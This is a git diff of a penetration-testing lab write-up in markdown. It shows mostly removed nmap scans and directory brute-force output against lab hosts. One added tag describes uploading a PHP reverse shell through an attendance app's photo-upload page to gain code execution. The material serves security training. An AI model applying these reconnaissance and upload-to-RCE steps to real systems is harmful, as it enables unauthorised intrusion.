@@ -16,13 +16,16 @@ tags:
   - Linux-Privilege-Escalation-backupfile
   - Windows-Privilege-Escalation-Putty
   - offsec
-lastmod: 2026-02-27T17:09:15.260Z
+  - Nmap
+  - Windows-Privilege-Escalation-SeImpersonatePrivilege
+  - nmap
+lastmod: 2026-04-03T12:17:00.265Z
 ---
 # Box Info
 
 This lab involves a sophisticated attack chain against an Active Directory environment. Learners begin by exploiting a vulnerable webapp to achieve remote code execution, followed by privilege escalation Privilege abuse. Through lateral movement, pivoting across network segments, and cracking Kerberos tickets, learners must enumerate and compromise domain assets to achieve full domain control.
 
-```
+{{< code >}}\
 10.10.188.140
 
 Challenge 4 - DC01 OS Credentials:
@@ -57,90 +60,21 @@ No credentials were provided for this machine
 
 Challenge 4 - Hermes OS Credentials:
 
-No credentials were provided for
-```
-
-### Information Gathering/NMAP — Scans
-
-```shell
-sudo nmap -iL ip_list --reason -vv -p-  -o openPort.txt
-```
-
-```shell
-# Nmap 7.95 scan initiated Mon Dec 15 13:43:35 2025 as: /usr/lib/nmap/nmap -iL ip_list --reason -vv -p- -o openPort.txt
-Nmap scan report for 192.168.208.141
-Host is up, received echo-reply ttl 125 (0.040s latency).
-Scanned at 2025-12-15 13:43:35 HKT for 121s
-Not shown: 65516 closed tcp ports (reset)
-PORT      STATE SERVICE        REASON
-22/tcp    open  ssh            syn-ack ttl 125
-80/tcp    open  http           syn-ack ttl 125
-81/tcp    open  hosts2-ns      syn-ack ttl 125
-135/tcp   open  msrpc          syn-ack ttl 125
-139/tcp   open  netbios-ssn    syn-ack ttl 125
-445/tcp   open  microsoft-ds   syn-ack ttl 125
-3306/tcp  open  mysql          syn-ack ttl 125
-3307/tcp  open  opsession-prxy syn-ack ttl 125
-5040/tcp  open  unknown        syn-ack ttl 125
-5985/tcp  open  wsman          syn-ack ttl 125
-47001/tcp open  winrm          syn-ack ttl 125
-49664/tcp open  unknown        syn-ack ttl 125
-49665/tcp open  unknown        syn-ack ttl 125
-49666/tcp open  unknown        syn-ack ttl 125
-49667/tcp open  unknown        syn-ack ttl 125
-49668/tcp open  unknown        syn-ack ttl 125
-49669/tcp open  unknown        syn-ack ttl 125
-49670/tcp open  unknown        syn-ack ttl 125
-51775/tcp open  unknown        syn-ack ttl 125
-
-Nmap scan report for 192.168.208.143
-Host is up, received echo-reply ttl 61 (0.039s latency).
-Scanned at 2025-12-15 13:43:35 HKT for 146s
-Not shown: 65525 filtered tcp ports (no-response)
-PORT     STATE SERVICE    REASON
-21/tcp   open  ftp        syn-ack ttl 61
-22/tcp   open  ssh        syn-ack ttl 61
-80/tcp   open  http       syn-ack ttl 61
-81/tcp   open  hosts2-ns  syn-ack ttl 61
-443/tcp  open  https      syn-ack ttl 61
-3000/tcp open  ppp        syn-ack ttl 61
-3001/tcp open  nessus     syn-ack ttl 61
-3003/tcp open  cgms       syn-ack ttl 61
-3306/tcp open  mysql      syn-ack ttl 61
-5432/tcp open  postgresql syn-ack ttl 61
-
-Nmap scan report for 192.168.208.144
-Host is up, received echo-reply ttl 61 (0.040s latency).
-Scanned at 2025-12-15 13:43:35 HKT for 122s
-Not shown: 65532 closed tcp ports (reset)
-PORT   STATE SERVICE REASON
-21/tcp open  ftp     syn-ack ttl 61
-22/tcp open  ssh     syn-ack ttl 61
-80/tcp open  http    syn-ack ttl 61
-
-Nmap scan report for 192.168.208.145
-Host is up, received echo-reply ttl 125 (0.040s latency).
-Scanned at 2025-12-15 13:43:35 HKT for 147s
-Not shown: 65528 filtered tcp ports (no-response)
-PORT     STATE SERVICE       REASON
-21/tcp   open  ftp           syn-ack ttl 125
-80/tcp   open  http          syn-ack ttl 125
-135/tcp  open  msrpc         syn-ack ttl 125
-139/tcp  open  netbios-ssn   syn-ack ttl 125
-445/tcp  open  microsoft-ds  syn-ack ttl 125
-1978/tcp open  unisql        syn-ack ttl 125
-3389/tcp open  ms-wbt-server syn-ack ttl 125
-
-Read data files from: /usr/share/nmap
-# Nmap done at Mon Dec 15 13:46:02 2025 -- 4 IP addresses (4 hosts up) scanned in 147.25 seconds
-
-```
+No credentials were provided for\
+{{< /code >}}
 
 # Recon 192.168.X.141
 
-### nmap
+### Nmap
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Nmap" >}} Start of nmap, showing web nicepage.com , Attendance and Payroll System, Not Found page ,mysql database(unauthorized),SMB
+
+{{< /toggle >}}
 
 ```shell
+┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
 └─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.208.141 -oN serviceScan.txt
 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 14:19 HKT
@@ -199,598 +133,20 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 ```
 
-### SSH 22 --Scans
-
-Burte force failed
-
-```
-1 of 1 target completed, 0 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-15 13:53:54
-```
-
-```
-2/tcp open  ssh     OpenSSH for_Windows_8.1 (protocol 2.0)
-| ssh-hostkey: 
-|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
-|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
-|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
-
-```
-
-### Web Recon 80
-
-只有program.txt 不過沒有甚麼用\
-\#####Default 404 Pages
-
-```
-Apache/2.4.51 (Win64) PHP/7.4.26 Server at 192.168.208.141 Port 80
-```
-
-\#####WebSite Directory BurteForce
-
-```shell
-301      GET        9l       29w      329c http://192.168.208.141/images => http://192.168.208.141/images/
-301      GET        9l       29w      327c http://192.168.208.141/blog => http://192.168.208.141/blog/
-200      GET       32l      240w    15730c http://192.168.208.141/images/4.png]]
-200      GET       28l       69w     3004c http://192.168.208.141/images/7.png]]
-200      GET       32l      130w    10021c http://192.168.208.141/images/9.png]]
-200      GET       28l       69w     2985c http://192.168.208.141/images/8.png]]
-200      GET       11l       83w     5785c http://192.168.208.141/images/82896c5cfbeb3e9d628d685761d5106b.jpeg
-200      GET       92l      607w    66833c http://192.168.208.141/images/1.jpeg
-200      GET       10l       95w     5460c http://192.168.208.141/images/e55bae5793cb5e5848bd5882209fecba.jpeg
-200      GET        6l       46w     2873c http://192.168.208.141/images/11.png]]
-200      GET       15l       64w     4334c http://192.168.208.141/images/8dc52c0f711979602e472cb74088d53b.jpeg
-200      GET       22l      148w    11627c http://192.168.208.141/images/6.png]]
-200      GET       19l       93w     6283c http://192.168.208.141/images/10.png]]
-200      GET       25l      148w    12449c http://192.168.208.141/images/5.png]]
-200      GET        9l       73w     4740c http://192.168.208.141/images/f9e95c14b7f65aff23628e89fe290e03.jpeg
-200      GET       13l       91w     5581c http://192.168.208.141/images/e7176968fc88a5540a57f287ff13ce4e.jpeg
-200      GET      114l      942w    57690c http://192.168.208.141/images/ddddddd.jpg
-301      GET        9l       29w      329c http://192.168.208.141/Images => http://192.168.208.141/Images/
-200      GET       77l      553w    76801c http://192.168.208.141/images/2.jpeg
-200      GET      247l     1030w    73110c http://192.168.208.141/images/pretty-smiling-joyfully-female-with-fair-hair-dressed-casually-looking-with-satisfaction_176420-15187.jpg
-200      GET     1965l     3441w    32038c http://192.168.208.141/Home.css
-200      GET       53l      363w    52008c http://192.168.208.141/images/3.jpeg
-200      GET       78l      332w    44713c http://192.168.208.141/blog/post-2.html
-200      GET      454l     2311w    36835c http://192.168.208.141/Home.html
-200      GET       78l      332w    56085c http://192.168.208.141/blog/post.html
-200      GET       78l      332w    62209c http://192.168.208.141/blog/post-4.html
-200      GET       78l      332w    62209c http://192.168.208.141/blog/post-1.html
-200      GET       78l      332w    56085c http://192.168.208.141/blog/post-3.html
-200      GET      163l      657w    53223c http://192.168.208.141/images/happy-man-with-long-thick-ginger-beard-has-friendly-smile_273609-16616.jpg
-301      GET        9l       29w      329c http://192.168.208.141/script => http://192.168.208.141/script/
-200      GET        2l     1297w    89476c http://192.168.208.141/jquery.js
-200      GET      267l     1386w   121071c http://192.168.208.141/images/pexels-photo-3694884.jpeg
-200      GET       32l      240w    15730c http://192.168.208.141/Images/4.png]]
-200      GET       28l       69w     2985c http://192.168.208.141/Images/8.png]]
-200      GET       13l       91w     5581c http://192.168.208.141/Images/e7176968fc88a5540a57f287ff13ce4e.jpeg
-200      GET        6l       46w     2873c http://192.168.208.141/Images/11.png]]
-200      GET       19l       93w     6283c http://192.168.208.141/Images/10.png]]
-200      GET       15l       64w     4334c http://192.168.208.141/Images/8dc52c0f711979602e472cb74088d53b.jpeg
-200      GET       28l       69w     3004c http://192.168.208.141/Images/7.png]]
-200      GET       10l       95w     5460c http://192.168.208.141/Images/e55bae5793cb5e5848bd5882209fecba.jpeg
-200      GET       32l      130w    10021c http://192.168.208.141/Images/9.png]]
-200      GET       22l      148w    11627c http://192.168.208.141/Images/6.png]]
-200      GET       11l       83w     5785c http://192.168.208.141/Images/82896c5cfbeb3e9d628d685761d5106b.jpeg
-200      GET        9l       73w     4740c http://192.168.208.141/Images/f9e95c14b7f65aff23628e89fe290e03.jpeg
-200      GET       25l      148w    12449c http://192.168.208.141/Images/5.png]]
-200      GET       77l      553w    76801c http://192.168.208.141/Images/2.jpeg
-200      GET        9l       31w      262c http://192.168.208.141/script/how%20to%20use%20the%20program.txt
-200      GET       78l      332w    44713c http://192.168.208.141/blog/post-5.html
-200      GET      371l     1658w    20700c http://192.168.208.141/script/GPO.ps1
-200      GET       53l      363w    52008c http://192.168.208.141/Images/3.jpeg
-200      GET       92l      607w    66833c http://192.168.208.141/Images/1.jpeg
-200      GET      257l     1644w   151247c http://192.168.208.141/images/Untitled-3.jpg
-200      GET      454l     2313w    36890c http://192.168.208.141/index
-200      GET      381l     2285w   181857c http://192.168.208.141/images/pexels-photo-4316302.jpeg
-200      GET       41l     2644w   179436c http://192.168.208.141/nicepage.js
-200      GET      295l     1853w   142785c http://192.168.208.141/Images/pexelsphoto3694703.jpeg
-200      GET      295l     1853w   142785c http://192.168.208.141/images/pexelsphoto3694703.jpeg
-200      GET      102l      836w    98239c http://192.168.208.141/images/default-image.jpg
-200      GET      267l     1386w   121071c http://192.168.208.141/Images/pexels-photo-3694884.jpeg
-200      GET      438l     2681w   218619c http://192.168.208.141/images/pexelsphoto3694884.jpeg
-200      GET      257l     1644w   151247c http://192.168.208.141/Images/Untitled-3.jpg
-200      GET      445l     2204w   201165c http://192.168.208.141/images/pexelsphoto3694710.jpeg
-200      GET    36435l    78744w  1230366c http://192.168.208.141/nicepage.css
-200      GET      454l     2313w    36890c http://192.168.208.141/
-200      GET      122l      622w   299314c http://192.168.208.141/blog/blog.html
-200      GET      438l     2681w   218619c http://192.168.208.141/Images/pexelsphoto3694884.jpeg
-200      GET      102l      836w    98239c http://192.168.208.141/Images/default-image.jpg
-200      GET      381l     2285w   181857c http://192.168.208.141/Images/pexels-photo-4316302.jpeg
-200      GET     1965l     3441w    32038c http://192.168.208.141/home
-200      GET     1965l     3441w    32038c http://192.168.208.141/Home
-200      GET        2l     1297w    89476c http://192.168.208.141/jquery
-301      GET        9l       29w      327c http://192.168.208.141/Blog => http://192.168.208.141/Blog/
-200      GET       78l      332w    44713c http://192.168.208.141/Blog/post-5.html
-200      GET       78l      332w    56085c http://192.168.208.141/Blog/post-3.html
-200      GET       78l      332w    62209c http://192.168.208.141/Blog/post-1.html
-301      GET        9l       29w      329c http://192.168.208.141/SCRIPT => http://192.168.208.141/SCRIPT/
-200      GET       78l      332w    62209c http://192.168.208.141/Blog/post-4.html
-200      GET       78l      332w    44713c http://192.168.208.141/Blog/post-2.html
-200      GET      122l      622w   299314c http://192.168.208.141/Blog/blog.html
-200      GET      371l     1658w    20700c http://192.168.208.141/SCRIPT/GPO.ps1
-200      GET        9l       31w      262c http://192.168.208.141/SCRIPT/how%20to%20use%20the%20program.txt
-200      GET       78l      332w    56085c http://192.168.208.141/Blog/post.html
-301      GET        9l       29w      329c http://192.168.208.141/Script => http://192.168.208.141/Script/
-200      GET        9l       31w      262c http://192.168.208.141/Script/how%20to%20use%20the%20program.txt
-200      GET      371l     1658w    20700c http://192.168.208.141/Script/GPO.ps1
-301      GET        9l       29w      329c http://192.168.208.141/IMAGES => http://192.168.208.141/IMAGES/
-200      GET       92l      607w    66833c http://192.168.208.141/IMAGES/1.jpeg
-200      GET       10l       95w     5460c http://192.168.208.141/IMAGES/e55bae5793cb5e5848bd5882209fecba.jpeg
-200      GET      114l      942w    57690c http://192.168.208.141/IMAGES/ddddddd.jpg
-200      GET       53l      363w    52008c http://192.168.208.141/IMAGES/3.jpeg
-200      GET       25l      148w    12449c http://192.168.208.141/IMAGES/5.png]]
-200      GET       32l      130w    10021c http://192.168.208.141/IMAGES/9.png]]
-200      GET       11l       83w     5785c http://192.168.208.141/IMAGES/82896c5cfbeb3e9d628d685761d5106b.jpeg
-200      GET      247l     1030w    73110c http://192.168.208.141/IMAGES/pretty-smiling-joyfully-female-with-fair-hair-dressed-casually-looking-with-satisfaction_176420-15187.jpg
-200      GET      267l     1386w   121071c http://192.168.208.141/IMAGES/pexels-photo-3694884.jpeg
-200      GET        6l       46w     2873c http://192.168.208.141/IMAGES/11.png]]
-200      GET       28l       69w     2985c http://192.168.208.141/IMAGES/8.png]]
-200      GET       28l       69w     3004c http://192.168.208.141/IMAGES/7.png]]
-200      GET        9l       73w     4740c http://192.168.208.141/IMAGES/f9e95c14b7f65aff23628e89fe290e03.jpeg
-200      GET       13l       91w     5581c http://192.168.208.141/IMAGES/e7176968fc88a5540a57f287ff13ce4e.jpeg
-200      GET       15l       64w     4334c http://192.168.208.141/IMAGES/8dc52c0f711979602e472cb74088d53b.jpeg
-200      GET       19l       93w     6283c http://192.168.208.141/IMAGES/10.png]]
-200      GET       22l      148w    11627c http://192.168.208.141/IMAGES/6.png]]
-200      GET       32l      240w    15730c http://192.168.208.141/IMAGES/4.png]]
-200      GET       77l      553w    76801c http://192.168.208.141/IMAGES/2.jpeg
-200      GET      163l      657w    53223c http://192.168.208.141/IMAGES/happy-man-with-long-thick-ginger-beard-has-friendly-smile_273609-16616.jpg
-200      GET      438l     2681w   218619c http://192.168.208.141/IMAGES/pexelsphoto3694884.jpeg
-200      GET      295l     1853w   142785c http://192.168.208.141/IMAGES/pexelsphoto3694703.jpeg
-200      GET      102l      836w    98239c http://192.168.208.141/IMAGES/default-image.jpg
-200      GET      257l     1644w   151247c http://192.168.208.141/IMAGES/Untitled-3.jpg
-200      GET      381l     2285w   181857c http://192.168.208.141/IMAGES/pexels-photo-4316302.jpeg
-200      GET      445l     2204w   201165c http://192.168.208.141/IMAGES/pexelsphoto3694710.jpeg
-200      GET        2l     1297w    89476c http://192.168.208.141/jQuery
-200      GET      454l     2313w    36890c http://192.168.208.141/Index
-200      GET     1965l     3441w    32038c http://192.168.208.141/HOME
-301      GET        9l       29w      327c http://192.168.208.141/BLOG => http://192.168.208.141/BLOG/
-200      GET       78l      332w    44713c http://192.168.208.141/BLOG/post-5.html
-200      GET       78l      332w    62209c http://192.168.208.141/BLOG/post-1.html
-200      GET      122l      622w   299314c http://192.168.208.141/BLOG/blog.html
-200      GET        2l     1297w    89476c http://192.168.208.141/JQuery
-200      GET       78l      332w    62209c http://192.168.208.141/BLOG/post-4.html
-200      GET       78l      332w    44713c http://192.168.208.141/BLOG/post-2.html
-200      GET       78l      332w    56085c http://192.168.208.141/BLOG/post.html
-200      GET       78l      332w    56085c http://192.168.208.141/BLOG/post-3.html
-200      GET        2l     1297w    89476c http://192.168.208.141/Jquery
-
-```
-
-```
-http://192.168.208.141/script/how%20to%20use%20the%20program.txt
-
-ExecutionPolicy RemoteSigned -Scope LocalMachine
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-
-Then edit where your GPO.ps1 is located and run in power shell
-& C:\user location\GPO.ps1
-```
-
 ### Web Reco 81
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "Web-SourceCode-DataLeak" >}} The website source code leak the page of attendance.php which leak the password
+{{< tag "Web-Attack" >}} Discovering CVE-50801 in tech stack title, which will abuse the /apsystem/admin/employee\_edit\_photo.php to upload php revshell  in the /apsystem/images/shell.php to have RCE
 
 {{< /toggle >}}
-
-![Pasted image 20251215143255.png](/ob/Pasted%20image%2020251215143255.png)\
-![Pasted image 20251215144325.png](/ob/Pasted%20image%2020251215144325.png)\
-![Pasted image 20251215144402.png](/ob/Pasted%20image%2020251215144402.png)
-
-### WebSite Directory BurteForce
-
-```shell
-404      GET        9l       32w      287c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-403      GET        9l       29w      290c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-301      GET        9l       29w      332c http://192.168.208.141:81/images => http://192.168.208.141:81/images/
-301      GET        9l       29w      331c http://192.168.208.141:81/admin => http://192.168.208.141:81/admin/
-200      GET        6l       18w      269c http://192.168.208.141:81/scripts
-301      GET        9l       29w      333c http://192.168.208.141:81/plugins => http://192.168.208.141:81/plugins/
-200      GET        8l       60w      972c http://192.168.208.141:81/attendance.php
-200      GET        7l      432w    37045c http://192.168.208.141:81/bower_components/bootstrap/dist/js/bootstrap.min.js
-301      GET        9l       29w      331c http://192.168.208.141:81/Admin => http://192.168.208.141:81/Admin/
-301      GET        9l       29w      328c http://192.168.208.141:81/db => http://192.168.208.141:81/db/
-200      GET       35l      221w    39141c http://192.168.208.141:81/images/profile.jpg
-200      GET        4l       66w    31000c http://192.168.208.141:81/bower_components/font-awesome/css/font-awesome.min.css
-200      GET        4l     1298w    86659c http://192.168.208.141:81/bower_components/jquery/dist/jquery.min.js
-200      GET        7l       56w      323c http://192.168.208.141:81/bower_components/font-awesome/HELP-US-OUT.txt
-200      GET      476l     1907w    11197c http://192.168.208.141:81/bower_components/jquery/dist/core.js
-200      GET       22l       34w      403c http://192.168.208.141:81/bower_components/font-awesome/bower.json
-200      GET       21l      171w     1085c http://192.168.208.141:81/bower_components/bootstrap/LICENSE
-200      GET        6l     1429w   121200c http://192.168.208.141:81/bower_components/bootstrap/dist/css/bootstrap.min.css
-200      GET        7l     1948w   106344c http://192.168.208.141:81/dist/css/AdminLTE.min.css
-200      GET        6l       15w      127c http://192.168.208.141:81/bower_components/bootstrap/Gemfile
-200      GET       43l       96w      903c http://192.168.208.141:81/bower_components/bootstrap/Gemfile.lock
-200      GET        7l       12w    21778c http://192.168.208.141:81/bower_components/font-awesome/css/font-awesome.css.map
-200      GET      511l     1200w    14386c http://192.168.208.141:81/bower_components/bootstrap/Gruntfile.js
-200      GET       25l       29w      422c http://192.168.208.141:81/bower_components/moment/bower.json
-200      GET     2337l     3940w    37414c http://192.168.208.141:81/bower_components/font-awesome/css/font-awesome.css
-200      GET     4463l    14467w   128945c http://192.168.208.141:81/bower_components/moment/moment.js
-200      GET      116l      295w     4280c http://192.168.208.141:81/
-200      GET        5l       43w      425c http://192.168.208.141:81/bower_components/bootstrap/CHANGELOG.md
-200      GET      301l      922w    11218c http://192.168.208.141:81/bower_components/jquery/AUTHORS.txt
-200      GET       34l       59w      641c http://192.168.208.141:81/bower_components/bootstrap/bower.json
-200      GET       14l       19w      190c http://192.168.208.141:81/bower_components/jquery/bower.json
-200      GET      282l      740w     8486c http://192.168.208.141:81/plugins/bootstrap-slider/slider.css
-200      GET       22l      169w     1075c http://192.168.208.141:81/bower_components/moment/LICENSE
-200      GET       32l       76w      964c http://192.168.208.141:81/bower_components/bootstrap/package.js
-200      GET      478l     1497w    14161c http://192.168.208.141:81/plugins/iCheck/icheck.js
-200      GET       61l      106w     1568c http://192.168.208.141:81/plugins/iCheck/all.css
-200      GET       10l       80w     4516c http://192.168.208.141:81/plugins/iCheck/icheck.min.js
-200      GET      712l     2073w    20497c http://192.168.208.141:81/bower_components/moment/moment.d.ts
-200      GET      766l     3340w    35103c http://192.168.208.141:81/bower_components/moment/CHANGELOG.md
-200      GET      134l      417w     3513c http://192.168.208.141:81/dist/css/skins/skin-green.css
-200      GET     1576l     4565w    51062c http://192.168.208.141:81/plugins/bootstrap-slider/bootstrap-slider.js
-200      GET       13l       50w      375c http://192.168.208.141:81/bower_components/font-awesome/scss/_larger.scss
-200      GET       12l       47w      459c http://192.168.208.141:81/bower_components/font-awesome/scss/_core.scss
-200      GET        5l       15w      134c http://192.168.208.141:81/bower_components/font-awesome/scss/_screen-reader.scss
-200      GET       60l      161w     1637c http://192.168.208.141:81/bower_components/font-awesome/scss/_mixins.scss
-200      GET        6l       15w      120c http://192.168.208.141:81/bower_components/font-awesome/scss/_fixed-width.scss
-200      GET       19l       44w      378c http://192.168.208.141:81/bower_components/font-awesome/scss/_list.scss
-200      GET        1l      128w     3719c http://192.168.208.141:81/dist/css/skins/skin-green-light.min.css
-200      GET       25l       71w      592c http://192.168.208.141:81/bower_components/font-awesome/scss/_bordered-pulled.scss
-200      GET       15l       37w      783c http://192.168.208.141:81/bower_components/font-awesome/scss/_path.scss
-200      GET       20l       47w      482c http://192.168.208.141:81/bower_components/font-awesome/scss/_stacked.scss
-200      GET      163l      500w     4533c http://192.168.208.141:81/dist/css/skins/skin-blue-light.css
-200      GET        1l       47w     2732c http://192.168.208.141:81/dist/css/alt/AdminLTE-select2.min.css
-200      GET        1l       29w     1469c http://192.168.208.141:81/dist/css/alt/AdminLTE-fullcalendar.min.css
-200      GET      760l     1654w    15719c http://192.168.208.141:81/dist/css/alt/AdminLTE-bootstrap-social.css
-200      GET        1l     1474w    41583c http://192.168.208.141:81/dist/css/skins/_all-skins.min.css
-200      GET        1l      132w     3513c http://192.168.208.141:81/dist/css/skins/skin-black.min.css
-200      GET      134l      417w     3560c http://192.168.208.141:81/dist/css/skins/skin-purple.css
-200      GET     1127l     2737w    27831c http://192.168.208.141:81/dist/js/adminlte.js
-200      GET       20l       88w     6046c http://192.168.208.141:81/dist/img/user4-128x128.jpg
-200      GET      349l     1562w    17298c http://192.168.208.141:81/dist/js/demo.js
-200      GET     1781l     5532w    48423c http://192.168.208.141:81/dist/css/skins/_all-skins.css
-200      GET       47l      265w    24361c http://192.168.208.141:81/dist/img/avatar04.png]]
-200      GET        3l        4w      351c http://192.168.208.141:81/dist/img/default-50x50.gif
-200      GET        7l       53w     4847c http://192.168.208.141:81/dist/img/user1-128x128.jpg
-200      GET       28l      149w    15048c http://192.168.208.141:81/dist/img/avatar2.png]]
-200      GET       27l      140w    11392c http://192.168.208.141:81/dist/img/user7-128x128.jpg
-200      GET       94l      209w     2284c http://192.168.208.141:81/bower_components/bootstrap/js/alert.js
-200      GET      116l      295w     4280c http://192.168.208.141:81/index
-200      GET       16l       96w     7493c http://192.168.208.141:81/dist/img/user6-128x128.jpg
-200      GET      800l     1613w    22644c http://192.168.208.141:81/bower_components/font-awesome/scss/_variables.scss
-200      GET       34l      184w    16798c http://192.168.208.141:81/dist/img/avatar3.png]]
-200      GET      162l      483w     4838c http://192.168.208.141:81/bower_components/bootstrap/js/affix.js
-200      GET      155l      317w     3905c http://192.168.208.141:81/bower_components/bootstrap/js/tab.js
-200      GET       82l      207w     2404c http://192.168.208.141:81/bower_components/moment/src/moment.js
-200      GET      172l      439w     4707c http://192.168.208.141:81/bower_components/bootstrap/js/scrollspy.js
-200      GET      108l      301w     3163c http://192.168.208.141:81/bower_components/bootstrap/js/popover.js
-200      GET      125l      341w     3824c http://192.168.208.141:81/bower_components/bootstrap/js/button.js
-200      GET      165l      419w     4743c http://192.168.208.141:81/bower_components/bootstrap/js/dropdown.js
-200      GET       56l      115w     1291c http://192.168.208.141:81/bower_components/bootstrap/less/bootstrap.less
-200      GET       26l       51w      594c http://192.168.208.141:81/bower_components/bootstrap/less/breadcrumbs.less
-200      GET      212l      476w     5991c http://192.168.208.141:81/bower_components/bootstrap/js/collapse.js
-200      GET      161l      347w     2987c http://192.168.208.141:81/bower_components/bootstrap/less/scaffolding.less
-200      GET      242l      577w     4930c http://192.168.208.141:81/bower_components/bootstrap/less/navs.less
-200      GET       69l      163w     1401c http://192.168.208.141:81/bower_components/bootstrap/less/code.less
-200      GET      424l     1110w     7559c http://192.168.208.141:81/bower_components/bootstrap/less/normalize.less
-200      GET       40l       72w     1136c http://192.168.208.141:81/bower_components/bootstrap/less/mixins.less
-200      GET       94l      534w    42816c http://192.168.208.141:81/bower_components/bootstrap/fonts/glyphicons-halflings-regular.woff
-200      GET       73l      429w    32536c http://192.168.208.141:81/bower_components/bootstrap/fonts/glyphicons-halflings-regular.woff2
-200      GET       60l      242w     1922c http://192.168.208.141:81/bower_components/moment/locale/da.js
-200      GET      100l      387w     3966c http://192.168.208.141:81/bower_components/moment/locale/el.js
-200      GET      291l      804w     8197c http://192.168.208.141:81/bower_components/bootstrap/less/theme.less
-200      GET       62l      135w     1557c http://192.168.208.141:81/plugins/iCheck/polaris/polaris.css
-200      GET       80l      336w     2929c http://192.168.208.141:81/bower_components/moment/locale/et.js
-200      GET       67l      283w     2185c http://192.168.208.141:81/bower_components/moment/locale/en-gb.js
-200      GET       24l      136w    11629c http://192.168.208.141:81/plugins/iCheck/polaris/polaris.png]]
-200      GET       97l      389w     3665c http://192.168.208.141:81/bower_components/moment/locale/lv.js
-200      GET       58l      221w     2574c http://192.168.208.141:81/bower_components/moment/locale/tzm.js
-200      GET      119l      398w     4803c http://192.168.208.141:81/bower_components/moment/locale/bo.js
-200      GET       90l      354w     3200c http://192.168.208.141:81/bower_components/moment/locale/mk.js
-200      GET        8l       34w     2537c http://192.168.208.141:81/plugins/iCheck/minimal/yellow@2x.png]]
-200      GET        8l       41w     2466c http://192.168.208.141:81/plugins/iCheck/minimal/minimal@2x.png]]
-200      GET        7l       28w     2063c http://192.168.208.141:81/plugins/iCheck/minimal/red.png]]
-200      GET       47l      399w    30342c http://192.168.208.141:81/plugins/iCheck/polaris/polaris@2x.png]]
-200      GET        9l       38w     2104c http://192.168.208.141:81/plugins/iCheck/minimal/orange.png]]
-200      GET       62l      136w     1626c http://192.168.208.141:81/plugins/iCheck/minimal/aero.css
-200      GET        7l       30w     2046c http://192.168.208.141:81/plugins/iCheck/minimal/blue.png]]
-200      GET       10l       35w     2009c http://192.168.208.141:81/plugins/iCheck/minimal/purple.png]]
-200      GET        9l       33w     2528c http://192.168.208.141:81/plugins/iCheck/minimal/grey@2x.png]]
-200      GET       56l      124w     1428c http://192.168.208.141:81/plugins/iCheck/flat/aero.css
-200      GET        7l       31w     2046c http://192.168.208.141:81/plugins/iCheck/minimal/grey.png]]
-200      GET       56l      124w     1428c http://192.168.208.141:81/plugins/iCheck/flat/grey.css
-200      GET       62l      136w     1660c http://192.168.208.141:81/plugins/iCheck/minimal/purple.css
-200      GET        6l       31w     2033c http://192.168.208.141:81/plugins/iCheck/minimal/yellow.png]]
-200      GET      210l      745w     6064c http://192.168.208.141:81/dist/js/pages/dashboard.js
-200      GET       62l      136w     1609c http://192.168.208.141:81/plugins/iCheck/minimal/red.css
-200      GET       62l      136w     1626c http://192.168.208.141:81/plugins/iCheck/minimal/pink.css
-200      GET        6l       35w     2462c http://192.168.208.141:81/plugins/iCheck/minimal/purple@2x.png]]
-200      GET       19l       79w     5743c http://192.168.208.141:81/plugins/iCheck/flat/grey@2x.png]]
-200      GET        4l       37w     2620c http://192.168.208.141:81/plugins/iCheck/minimal/red@2x.png]]
-200      GET       10l       35w     2048c http://192.168.208.141:81/plugins/iCheck/minimal/green.png]]
-200      GET        5l       30w     2022c http://192.168.208.141:81/plugins/iCheck/minimal/aero.png]]
-200      GET        5l       39w     2552c http://192.168.208.141:81/plugins/iCheck/minimal/orange@2x.png]]
-200      GET       14l       85w     5843c http://192.168.208.141:81/plugins/iCheck/flat/flat@2x.png]]
-200      GET       17l      105w     5940c http://192.168.208.141:81/plugins/iCheck/flat/orange@2x.png]]
-200      GET       56l      124w     1458c http://192.168.208.141:81/plugins/iCheck/flat/purple.css
-200      GET      106l      587w    35387c http://192.168.208.141:81/bower_components/bootstrap/fonts/glyphicons-halflings-regular.eot
-200      GET      156l     1018w    78571c http://192.168.208.141:81/dist/img/boxed-bg.png]]
-200      GET       56l      123w     1421c http://192.168.208.141:81/plugins/iCheck/futurico/futurico.css
-200      GET       14l       76w     5830c http://192.168.208.141:81/plugins/iCheck/flat/blue@2x.png]]
-200      GET       78l      313w     2728c http://192.168.208.141:81/bower_components/moment/locale/de.js
-200      GET        9l       43w     2687c http://192.168.208.141:81/plugins/iCheck/flat/red.png]]
-200      GET       56l      124w     1458c http://192.168.208.141:81/plugins/iCheck/flat/orange.css
-200      GET       28l       93w     6156c http://192.168.208.141:81/plugins/iCheck/futurico/futurico@2x.png]]
-200      GET      122l      492w     4097c http://192.168.208.141:81/bower_components/moment/locale/gom-latn.js
-200      GET      104l      376w     3310c http://192.168.208.141:81/bower_components/moment/locale/zh-tw.js
-200      GET       99l      313w     2483c http://192.168.208.141:81/bower_components/moment/locale/ur.js
-200      GET      107l      422w     3645c http://192.168.208.141:81/bower_components/moment/locale/fi.js
-200      GET       73l      297w     2454c http://192.168.208.141:81/bower_components/moment/locale/eo.js
-200      GET       63l      253w     2025c http://192.168.208.141:81/bower_components/moment/locale/en-ca.js
-200      GET      107l      432w     3784c http://192.168.208.141:81/bower_components/moment/locale/pl.js
-200      GET      288l    13959w   108738c http://192.168.208.141:81/bower_components/bootstrap/fonts/glyphicons-halflings-regular.svg
-200      GET       59l      226w     2192c http://192.168.208.141:81/bower_components/moment/locale/ar-kw.js
-200      GET      126l      439w     4423c http://192.168.208.141:81/bower_components/moment/locale/kn.js
-200      GET       69l      257w     2172c http://192.168.208.141:81/bower_components/moment/locale/ko.js
